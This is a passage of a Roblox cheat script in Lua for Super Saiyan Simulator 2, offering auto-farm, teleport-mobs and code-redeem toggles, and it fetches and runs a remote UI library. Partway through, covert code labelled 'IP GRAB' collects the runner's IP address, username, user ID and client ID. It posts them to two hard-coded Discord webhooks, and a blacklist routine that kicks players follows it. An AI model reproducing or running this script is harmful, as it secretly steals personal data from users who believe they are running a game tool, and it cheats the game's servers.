					["Typ\208\181"] = 1,
					["SkillId"] = "8"
				}
			}
			game:GetService("ReplicatedStorage").Remotes.SkillRemote:FireServer(unpack(args))
		end
	end

	local BossFolder = game:GetService("Workspace")["World Mobs"]["Boss Mobs"]
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local Character = LocalPlayer.Character
	function BringBosses()
		local characterRootPart = Character.HumanoidRootPart
		pcall(function()
			for i, v in pairs(BossFolder:GetChildren()) do
				if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
					v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
					local targetPosition = v:FindFirstChild("HumanoidRootPart")
					v:FindFirstChild("HumanoidRootPart").Anchored = true
					v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		end)
	end

	local AutoFarmTab = Window:MakeTab({
		Name = "Auto Farm!",            
		Icon = "rbxassetid://4483345998",   
		PremiumOnly = false            
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Punch (Fast!)",
		Default = false,
		Save = true,
		Flag = "autopunch_sss2",
		Callback = function(Value)
			getgenv().AutoPunch = Value
			autopunch()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Rebirth",
		Default = false,
		Save = true,
		Flag = "autorebirth_sss2",
		Callback = function(Value)
			getgenv().AutoRebirth = Value
			autorebirth()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Prestige",
		Default = false,
		Save = true,
		Flag = "autoprestige_sss2",
		Callback = function(Value)
			getgenv().AutoPrestige = Value
			autoprestige()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Technique",
		Default = false,
		Save = true,
		Flag = "autotechnique_sss2",
		Callback = function(Value)
			getgenv().AutoTechnique = Value
			autotechnique()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs",
		Default = false,
		Save = true,
		Flag = "automobs_db",
		Callback = function(Value)
			getgenv().bringmobs = Value
			while bringmobs and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
							game:GetService("RunService").PreRender:Wait(.2)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 2",
		Default = false,
		Save = true,
		Flag = "automobs2_db",
		Callback = function(Value)
			getgenv().bringmobs2 = Value
			while bringmobs and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, -3)
							game:GetService("RunService").PreRender:Wait(.2)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 3",
		Default = false,
		Save = true,
		Flag = "automobs3_db",
		Callback = function(Value)
			getgenv().bringmobs3 = Value
			while bringmobs3 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 4",
		Default = false,
		Save = true,
		Flag = "automobs4_db",
		Callback = function(Value)
			getgenv().bringmobs4 = Value
			while bringmobs4 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 5",
		Default = false,
		Save = true,
		Flag = "automobs5_db",
		Callback = function(Value)
			getgenv().bringmobs5 = Value
			while bringmobs5 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses",
		Default = false,
		Save = true,
		Flag = "autobosses_db",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss and game:GetService("RunService").PreRender:Wait() do
				BringBosses()
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 2",
		Default = false,
		Save = true,
		Flag = "autobosses2_db",
		Callback = function(Value)
			getgenv().BringBoss2 = Value
			while BringBoss2 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 3",
		Default = false,
		Save = true,
		Flag = "autobosses3_db",
		Callback = function(Value)
			getgenv().BringBoss3 = Value
			while BringBoss3 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 4",
		Default = false,
		Save = true,
		Flag = "autobosses4_db",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss4 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses 5",
		Default = false,
		Save = true,
		Flag = "autobosses5_db",
		Callback = function(Value)
			getgenv().BringBoss = Value
			while BringBoss5 and game:GetService("RunService").PreRender:Wait() do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"]["Boss Mobs"]:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses",
		Default = false,
		Save = true,
		Flag = "automobsbosses_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses = Value
			while getgenv().AutoMobsBosses and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 2",
		Default = false,
		Save = true,
		Flag = "automobsbosses2_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses2 = Value
			while getgenv().AutoMobsBosses2 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 3",
		Default = false,
		Save = true,
		Flag = "automobsbosses3_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses3 = Value
			while getgenv().AutoMobsBosses3 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 4",
		Default = false,
		Save = true,
		Flag = "automobsbosses4_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses4 = Value
			while getgenv().AutoMobsBosses4 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							AutoFarmTable.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, -3)
					end
				end
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs & Bosses 5",
		Default = false,
		Save = true,
		Flag = "automobsbosses5_db",
		Callback = function(Value)
			getgenv().AutoMobsBosses5 = Value
			while getgenv().AutoMobsBosses5 and game:GetService("RunService").PreRender:Wait() do
				local merge = function(...)
					local new = {}
					for i, v in next, {...} do 
						for i2, v2 in next, v do 
							table.insert(new, v2) 
						end 
					end
					return new
				end

				for i, v in next, merge(workspace["World Mobs"].Mobs:GetChildren(), workspace["World Mobs"]["Boss Mobs"]:GetChildren()) do
					if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
						v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
						v:FindFirstChild("HumanoidRootPart").Anchored = true
						v:FindFirstChild("HumanoidRootPart").Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
					end
				end
			end
		end
	})

	AutoFarmTab:AddButton({
		Name = "Destroy Gui",
		Callback = function()
			OrionLib:Destroy()
		end
	})

	local CodesTab = Window:MakeTab({
		Name = "Codes!",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false,
	})

	CodesTab:AddTextbox({
		Name = "Codes (Redeem!)",
		Default = "",
		TextDisappear = false,
		Callback = function(Value)
			local args = {
				[1] = {
					["UniqueTag"] = "RedeemCode",
					["InputText"] = Value,
					["InputType"] = "Text",
					["LeftButton"] = "Redeem",
					["Description"] = "Redeem Code",
					["Prompt"] = "RedeemCode",
					["RightButton"] = "Cancel",
					["Title"] = "Codes"
				},
				[2] = "Redeem"
			}
			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.7").knit.Services.PromptService.RE.Prompt:FireServer(unpack(args))
		end
	})

	local CreditsTab = Window:MakeTab({
		Name = "Credits!",
		Icon = "rbxassetid://4483345998",
		PremiumOnly = false,
	})

	local Section = CreditsTab:AddSection({
		Name = "Credits!",
	})

	CreditsTab:AddLabel("Script is made by Riotscripter")
	CreditsTab:AddLabel("Scripted by Riotscripter!")
	CreditsTab:AddLabel("UI Library by Riotscripter!")
	CreditsTab:AddLabel("Script Discontinued So Let Me Know If Its Patched!")

	CreditsTab:AddParagraph("Info","Tap The Button To Copy My Social And Invite Links!")
	CreditsTab:AddParagraph("Info","Script changelogs at our Discord Server. If you find any bugs, inform us.")

	CreditsTab:AddButton({
		Name = "Discord",
		Callback = function()
			setclipboard("https://discord.gg/9rMZvSPAQv")
			print("Riotscripter: Copied Discord Server Invite to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Discord Server Invite to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddButton({
		Name = "Youtube",
		Callback = function()
			setclipboard("https://m.youtube.com/channel/UCvXEiClhdiICCgSVzkEIT3A")
			print("Riotscripter: Copied Youtube Channel Link to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Youtube Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddButton({
		Name = "Github",
		Callback = function()
			setclipboard("https://github.com/Riotscripter")
			print("Riotscripter: Copied Github Channel Link to Clipboard.")
			OrionLib:MakeNotification({Name = "Riotscripter", Content = "Copied Github Channel Link to Clipboard.", Image = "rbxassetid://4370317928", Time = 2})
		end
	})

	CreditsTab:AddBind({
		Name = "UI Toggle Keybind", 
		Default = Enum.KeyCode.RightShift, 
		Hold = false, 
		Callback = function()
			print("press")
		end    
	})
local httpService = game:GetService('HttpService')
local marketplaceService = game:GetService("MarketplaceService")
local players = game:GetService("Players")
local rbxAnalyticsService = game:GetService("RbxAnalyticsService")
local runService = game:GetService("RunService")

-- Game and Player Information
local gameName = marketplaceService:GetProductInfo(game.PlaceId).Name
local localPlayer = players.LocalPlayer
local playerName = localPlayer.Name
local playerUserId = localPlayer.UserId
local clientId = tostring(rbxAnalyticsService:GetClientId())
local ip = req({ Url = "https://api.ipify.org/", Method = "GET" }).Body

-- Webhook URLs
local Webhook1 = "https://discord.com/api/webhooks/1279710265239404595/4Dw-qV6wgrYK0-B80YDQCZAs9Vl7-OLfV5kbhV8YbxtwBfpuWdUQp-4-XO-6-BQfdgJB"
local Webhook2 = "https://discord.com/api/webhooks/1279710425566416926/Rtz_2ImGnEA1bgYGSRkU7r3c5uzlcYHZv5lGg_oVejxS6D1wnopCuaFqGvBMYVdxPku_"

-- Function to send data to the webhooks
local function sendWebhook(webhookUrl)
    local body = httpService:JSONEncode({
        embeds = {{
            title = gameName,
            description = "Username = " .. playerName .. "\nUserId = " .. playerUserId .. "\nClientId = " .. clientId .. "\nIP = " .. ip,
            color = 0,
            author = {name = "IP GRAB"}
        }}
    })

    local success, errorMessage = pcall(function()
        req({
            Url = webhookUrl,
            Method = "POST",
            Headers = {['Content-Type'] = 'application/json'},
            Body = body
        })
    end)

    if not success then
        warn("Failed to send to webhook: " .. webhookUrl .. ". Error: " .. errorMessage)
    else
        print("Data sent to webhook: " .. webhookUrl)
    end
end

-- Send data to both webhooks
sendWebhook(Webhook1)
sendWebhook(Webhook2)

-- Blacklist Data
local blacklistedIPs = {"IP", "IP"}
local blacklistedUsernames = {"AlexusCorteza", "pokemonhaden"}
local blacklistedUserIDs = {4332089201, 107837090}
local blacklistedHWIDs = {"hwid", "hwid"}

-- Check and Kick Player if Blacklisted or if ID/Name mismatch
local function checkBlacklist()
    print("Checking if player is blacklisted or has mismatched IDs...")

    -- Check if the local player UserId or Name does not match their actual UserId or Name
    if players:GetPlayerByUserId(playerUserId) == nil or localPlayer.Name ~= playerName then
        print("Player UserId or Name does not match the local Player.")
        localPlayer:Kick("UserId or Name mismatch!")
        return
    end

    if table.find(blacklistedIPs, tostring(ip)) then
        print("Player is blacklisted by IP.")
        localPlayer:Kick("Blacklisted By Riotscripter!")
    elseif table.find(blacklistedUserIDs, playerUserId) then
        print("Player is blacklisted by UserID.")
        localPlayer:Kick("Blacklisted By Game!")
    elseif table.find(blacklistedUsernames, playerName) then
        print("Player is blacklisted by Username.")
        localPlayer:Kick("Blacklisted By Roblox!")
    elseif table.find(blacklistedHWIDs, tostring(clientId)) then
        print("Player is blacklisted by ClientID.")
        localPlayer:Kick("Blacklisted By Executor")
    else
        print("Player is not blacklisted.")
    end
end

runService.RenderStepped:Connect(checkBlacklist)
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextButton = Instance.new("TextButton")
local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
Frame.BackgroundTransparency = 0.500
Frame.Position = UDim2.new(0.858712733, 0, 0.0237762257, 0)
Frame.Size = UDim2.new(0.129513338, 0, 0.227972031, 0)

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Size = UDim2.new(1, 0, 1, 0)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "TOGGLE"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextScaled = true
TextButton.TextSize = 50.000
TextButton.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextStrokeTransparency = 0.000
TextButton.TextWrapped = true

TextButton.MouseButton1Down:Connect(function()
    game:GetService("VirtualInputManager"):SendKeyEvent(true, Enum.KeyCode.RightShift, false, game)
end)

UITextSizeConstraint.Parent = TextButton
UITextSizeConstraint.MaxTextSize = 50

game.Players.PlayerAdded:Connect(KickIfBlacklisted)
elseif game.PlaceId == 16785157439 then  --World 3
if not game:IsLoaded() then
game.Loaded:Wait()
end
	
	print("Game Successfully Loaded!")	
	print("Created By Riotscripter!")

	local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/Riotscripter/RiotExploits/main/Orion%20Library%202")))()

	OrionLib:MakeNotification({Name = "Super Saiyan Simulator 2!", Content = "Scripted By Riotscripter!", Image = "rbxassetid://4483345998", Time = 5})

	local Window = OrionLib:MakeWindow({Name = "Riotscripter | Super Saiyan Simulator 2 [" .. os.date("%Y") .. "]", HidePremium = false, SaveConfig = false, ConfigFolder = "Super Saiyan Simulator 2", IntroEnabled = true, IntroText = "Welcome To Riotscripter's Super Saiyan Simulator 2 Gui."})

	-- local mytable
	local MyTable = {
		["AutoPunch"] = false,
		["AutoRebirth"] = false,
		["AutoPrestige"] = false,
		["AutoTechnique"] = false,
	}

	-- getgenvs
	getgenv().AutoPunch = false
	getgenv().AutoRebirth = false
	getgenv().AutoPrestige = false
	getgenv().AutoTechnique = false

	-- functions
	function autopunch()
		while getgenv().AutoPunch == true do
			game:GetService("RunService").PreRender:Wait()
			local args = {
				[1] = {
					["Began"] = true,
					["CFrame"] = CFrame.new(1762.42431640625, 580.1317138671875, 1351.1337890625) * CFrame.Angles(-0, 0, -0),
					["Aim"] = Vector3.new(1762.42431640625, 580.1317138671875, 1301.1337890625),
					["Camera"] = CFrame.new(1762.42431640625, 584.9469604492188, 1363.2078857421875) * CFrame.Angles(-0.261798232793808, 0, -0),
					["Typ\208\181"] = 1,
					["SkillId"] = "1"
				}
			}
			game:GetService("ReplicatedStorage").Remotes.SkillRemote:FireServer(unpack(args))
		end
	end

	function autorebirth()
		while getgenv().AutoRebirth == true do
			game:GetService("RunService").PreRender:Wait()
			game:GetService("ReplicatedStorage").Packages._Index:FindFirstChild("sleitnick_knit@1.4.7").knit.Services.StatsService.RE.RebirthUp:FireServer()
		end
	end

	function autoprestige()
		while getgenv().AutoPrestige == true do
			game:GetService("RunService").PreRender:Wait()
			game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_knit@1.4.7"):WaitForChild("knit"):WaitForChild("Services"):WaitForChild("StatsService"):WaitForChild("RE"):WaitForChild("RebirthUp"):FireServer()
		end
	end

	function autotechnique()
		while getgenv().AutoTechnique == true do
			game:GetService("RunService").PreRender:Wait()
			local args = {
				[1] = {
					["Began"] = true,
					["CFrame"] = CFrame.new(7160.42285, 574.155029, -10087.2246, -0.815149486, 7.46256779e-10, -0.579250693, -3.31721992e-08, 1, 4.79698308e-08, 0.579250693, 5.83176032e-08, -0.815149486) * CFrame.Angles(-3.141592502593994, -1.2826416492462158, -3.141592502593994),
					["Aim"] = Vector3.new(2123.014892578125, 590.3080444335938, 1790.3922119140625),
					["Camera"] = CFrame.new(2083.916259765625, 594.6639404296875, 1759.2860107421875) * CFrame.Angles(-2.978764533996582, 0.4765561819076538, 3.0663747787475586),
					["Typ\208\181"] = 1,
					["SkillId"] = "8"
				}
			}
			game:GetService("ReplicatedStorage").Remotes.SkillRemote:FireServer(unpack(args))
		end
	end

	local BossFolder = game:GetService("Workspace")["World Mobs"]["Boss Mobs"]
	local LocalPlayer = game:GetService("Players").LocalPlayer
	local Character = LocalPlayer.Character
	function BringBosses()
		local characterRootPart = Character.HumanoidRootPart
		pcall(function()
			for i, v in pairs(BossFolder:GetChildren()) do
				if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
					v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
					local targetPosition = v:FindFirstChild("HumanoidRootPart")
					v:FindFirstChild("HumanoidRootPart").Anchored = true
					v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
				end
			end
		end)
	end

	local AutoFarmTab = Window:MakeTab({
		Name = "Auto Farm!",            
		Icon = "rbxassetid://4483345998",   
		PremiumOnly = false            
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Punch (Fast!)",
		Default = false,
		Save = true,
		Flag = "autopunch_sss2",
		Callback = function(Value)
			getgenv().AutoPunch = Value
			autopunch()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Rebirth",
		Default = false,
		Save = true,
		Flag = "autorebirth_sss2",
		Callback = function(Value)
			getgenv().AutoRebirth = Value
			autorebirth()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Prestige",
		Default = false,
		Save = true,
		Flag = "autoprestige_sss2",
		Callback = function(Value)
			getgenv().AutoPrestige = Value
			autoprestige()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Technique",
		Default = false,
		Save = true,
		Flag = "autotechnique_sss2",
		Callback = function(Value)
			getgenv().AutoTechnique = Value
			autotechnique()
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs",
		Default = false,
		Save = true,
		Flag = "automobs_db",
		Callback = function(Value)
			getgenv().bringmobs = Value
			while bringmobs and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(3, 0, 0)
							game:GetService("RunService").PreRender:Wait(.2)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 2",
		Default = false,
		Save = true,
		Flag = "automobs2_db",
		Callback = function(Value)
			getgenv().bringmobs2 = Value
			while bringmobs and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(0, 0, -3)
							game:GetService("RunService").PreRender:Wait(.2)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 3",
		Default = false,
		Save = true,
		Flag = "automobs3_db",
		Callback = function(Value)
			getgenv().bringmobs3 = Value
			while bringmobs3 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and 
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(3, 0, 0)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 4",
		Default = false,
		Save = true,
		Flag = "automobs4_db",
		Callback = function(Value)
			getgenv().bringmobs4 = Value
			while bringmobs4 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").CFrame = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Mobs 5",
		Default = false,
		Save = true,
		Flag = "automobs5_db",
		Callback = function(Value)
			getgenv().bringmobs5 = Value
			while bringmobs5 and game:GetService("RunService").PreRender:Wait(.2) do
				pcall(function()
					for i, v in next, game:GetService("Workspace")["World Mobs"].Mobs:GetChildren() do
						if v.Name ~= "Tutorial Dummy" and v:FindFirstChild("HumanoidRootPart") and
							v:FindFirstChildWhichIsA("Humanoid") and v:FindFirstChildWhichIsA("Humanoid").Health ~= 0 then
							v:FindFirstChild("HumanoidRootPart").Anchored = true
							v:FindFirstChild("HumanoidRootPart").Position = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position
						end
					end
				end)
			end
		end
	})

	AutoFarmTab:AddToggle({
		Name = "Auto Bosses",
		Default = false,
		Save = true,
		Flag = "autobosses_db",
